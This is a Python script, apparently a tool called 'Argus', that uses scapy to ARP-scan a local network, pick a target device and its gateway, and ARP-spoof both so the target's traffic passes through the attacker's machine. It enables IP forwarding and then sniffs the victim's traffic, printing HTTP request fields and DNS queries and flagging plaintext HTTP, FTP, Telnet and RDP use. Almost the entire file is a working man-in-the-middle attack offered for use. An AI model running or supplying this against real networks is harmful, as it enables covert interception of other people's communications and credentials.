import threading
from colorama import Fore,Back,Style
from scapy.all import *
from scapy.layers import http
import sys
import os
import fcntl
import socket
import struct

"""
Author : O5wald (Aryan Kapse)
Date : 19/03/2022
license : MIT
"""

banner = """
 ▄▄▄       ██▀███    ▄████  █    ██   ██████ 
▒████▄    ▓██ ▒ ██▒ ██▒ ▀█▒ ██  ▓██▒▒██    ▒ 
▒██  ▀█▄  ▓██ ░▄█ ▒▒██░▄▄▄░▓██  ▒██░░ ▓██▄   
░██▄▄▄▄██ ▒██▀▀█▄  ░▓█  ██▓▓▓█  ░██░  ▒   ██▒
 ▓█   ▓██▒░██▓ ▒██▒░▒▓███▀▒▒▒█████▓ ▒██████▒▒
 ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
  ▒   ▒▒ ░  ░▒ ░ ▒░  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░
  ░   ▒     ░░   ░ ░ ░   ░  ░░░ ░ ░ ░  ░  ░  
      ░  ░   ░           ░    ░           ░                                             
"""

print(Fore.LIGHTRED_EX+banner+Style.RESET_ALL)

ips = []
macs = []
unsecure_p = (80,21)

external = []
# Enable IP forwarding


def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


your_mac = getHwAddr('wlx3460f9f541aa')

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        
def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")
        
# getting details of packets

def print_summary(pkt):
  if pkt.haslayer(http.HTTPRequest):
      print(Back.GREEN+"some packet has this layer!"+Style.RESET_ALL)
      http_layer = pkt.getlayer(http.HTTPRequest)
      print(f"{http_layer.fields}")
  if IP in pkt:
      try:
        ls = socket.gethostbyaddr(pkt[IP].src)
        print(Fore.GREEN+ls[0]+Style.RESET_ALL)
      except:
          pass
      if pkt[IP].src not in external:
        external.append(pkt[IP].src)
        print(Fore.GREEN+"SRC:", pkt[IP].src, "\t\tDEST:", pkt[IP].dst+Style.RESET_ALL)
  
  if DNS in pkt:
      try:
        ls = socket.gethostbyaddr(pkt[IP].src)
        print(Fore.GREEN+ls+Style.RESET_ALL)
        print("Domain:", pkt[DNS].qd.qname.decode("utf-8"))
      except:
          pass
  if TCP in pkt:
      if pkt[TCP].sport == 80 or pkt[TCP].dport == 80:
          print(Back.RED+f"[+] Data From {pkt[IP].src} is not Secure "+Style.RESET_ALL)
      elif pkt[TCP].sport == 23 or pkt[TCP].dport == 23:
          print(Back.YELLOW+f"[+] {pkt[IP].src} is using Telnet which is not Secure!"+Style.RESET_ALL)
      elif pkt[TCP].sport == 21 or pkt[TCP].dport == 21 or pkt[TCP].sport == 21 or pkt[TCP].dport == 21:
          print(Back.YELLOW+f"[+] {pkt[IP].src} is using FTP to Transfer File!! FTP is not Secure"+Style.RESET_ALL) 
      elif pkt[TCP].sport == 3389 or pkt[TCP].dport == 3389:
          print(Back.YELLOW+f"[+] {pkt[IP].src} is Trying to Connect to Remote Desktop!"+Style.RESET_ALL)
  
      
# getting mac addresses and ip addresses of devices

def threader_func(subnet):
    resp,nresp = arping(f"{subnet}", verbose=0)
    for snd,re in resp:
        if re[Ether].src in macs:
            pass
        else:
            macs.append(re[Ether].src)
            ips.append(re[ARP].psrc)

thr = []
def mac_output(subnet):
    for i in range(50):
        t = threading.Thread(target=threader_func,args=(subnet,))
        thr.append(t)
        t.start()
    
    for th in thr:
        th.join()

    for i in range(len(macs)):
        print(f"{i+1})","IP:",ips[i],"MAC:",macs[i])

# select target to monitor

def spoof_router(host,gateway):
    while True:
        arp_pkt = ARP()
        arp_pkt.psrc = f'{ips[host]}'
        arp_pkt.hwsrc = your_mac
        arp_pkt.pdst = f'{ips[gateway]}'
        arp_pkt.hwdst = f'{macs[gateway]}'
        send(arp_pkt,verbose=0)
        time.sleep(3)

def spoof_user(host,gateway):
    while True:
        arp_pkt = ARP()
        arp_pkt.psrc = f'{ips[gateway]}'
        arp_pkt.pdst = f'{ips[host]}'
        arp_pkt.hwsrc = your_mac
        arp_pkt.hwdst = f'{macs[host]}'
        send(arp_pkt,verbose=0)
        time.sleep(3)

iface_names = []
def iface_select():
    names = socket.if_nameindex()
    iface_names = []
    for i in range(len(names)):
        iface_names.append(names[i][1])
    for t in range(len(iface_names)):
        print(f"{t+1})",iface_names[t])
    select = int(input(Fore.BLUE+"\nSelect Network Interface : "+Style.RESET_ALL))
    int_face = iface_names[select-1]
    return int_face

try:
    iface = iface_select()
    while True:
        # print("\n")
        sub = input(Fore.YELLOW+"Enter your IP in CIDR notation (Example : 192.168.1.0/24 or 192.168.256.0/24): "+Style.RESET_ALL)
        if '/' not in sub:
            print(Fore.RED+"You enterd Wrong Subnet Mask Please Enter Right one!"+Style.RESET_ALL)
            continue
        else:
            print(Fore.LIGHTBLUE_EX+"\n[+] Scanning for Devices on Network!"+Style.RESET_ALL)
            mac_output(sub)
            print(Fore.LIGHTGREEN_EX+"[+] Done !"+Style.RESET_ALL)
            while True:
                try:
                    inp = input(Fore.YELLOW+"\n[+] Do You Want to Scan for Devices Again?[Y/N]: "+Style.RESET_ALL)
                    if inp == 'y' or inp == 'Y':
                        mac_output(sub)
                        print(Fore.LIGHTGREEN_EX+"[+] Done!"+Style.RESET_ALL)
                        continue
                    elif inp == 'n' or inp == 'N':
                        try:
                            target = int(input(Fore.BLUE+"\nSelect The Device Which you want to monitor (Index No. of Device) :"+Style.RESET_ALL))
                            host = target-1
                            gate = int(input(Fore.BLUE+"\nSelect the gateway (Index No. of Router) : "+Style.RESET_ALL))
                            gateway = gate-1

                            enable_ip_route()
                            
                            t1 = threading.Thread(target=spoof_router,args=(host,gateway))
                            t2 = threading.Thread(target=spoof_user,args=(host,gateway))
                            t1.start()
                            t2.start()

                            print(Fore.LIGHTCYAN_EX+"[+] Collecting the Incoming and Outgoing Data From Device !!"+Style.RESET_ALL)
                            sniff( iface=f"{iface}",filter=f"host {ips[host]}", prn=print_summary)
                        except KeyboardInterrupt:
                            print("[+] Exiting!")
                            sys.exit()
                    else :
                        print("Invalid Input Given Plz try again!")
                        continue
                except KeyboardInterrupt:
                    sys.exit()
except KeyboardInterrupt:
    print("You Cancelled the process!")
    sys.exit()